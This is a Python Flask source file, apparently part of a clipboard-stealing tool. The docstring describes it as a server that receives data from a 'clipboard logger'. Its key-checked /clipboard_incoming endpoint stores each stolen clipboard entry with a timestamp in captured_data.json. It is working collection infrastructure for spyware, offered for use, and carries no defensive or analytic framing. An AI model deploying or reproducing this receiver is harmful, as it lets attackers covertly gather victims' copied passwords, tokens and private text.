'''
Product: Data Receive Server
Description: Receives data from the clipboard logger and 
             stores the information in a JSON file
Author: Benjamin Norman 2023
'''

from flask import app, request, Flask, Response
import json
import time
import os

# Variables to change
key = "API KEY CHANGE ME"
hostedPort = 8080


app = Flask(__name__)

def file_upload(data):
    
    capturedData = {"data":"", "timestamp": 0.0}
    capturedData["data"] = data
    capturedData["timestamp"] = time.time()

    with open("captured_data.json", 'r+') as f:
        try:
            file_data = json.load(f)
        except json.decoder.JSONDecodeError:
            file_data = {"data":[]}
            
        file_data["data"].append(capturedData)
        f.seek(0) # Resets the pointer to teh start of the file
        json.dump(file_data, f, indent=4)
        f.close()

@app.route('/clipboard_incoming', methods=['POST'])
def clipboard_incoming():
    if request.method == 'POST':
        jsonData = request.get_json()
        
        if jsonData["key"] == key:
            file_upload(jsonData["data"])
            return 'Successful'
        else:
            return Response('Invalid API key', status=400)
    else:
        return Response('Invalid request method', status=400)
 
if __name__ == '__main__':
    
    ### Checks to see if all files are there ###
    
    if os.path.exists("captured_data.json") != True:
        file = open("captured_data.json", "w")
        file.close()
    
    app.run(port=hostedPort)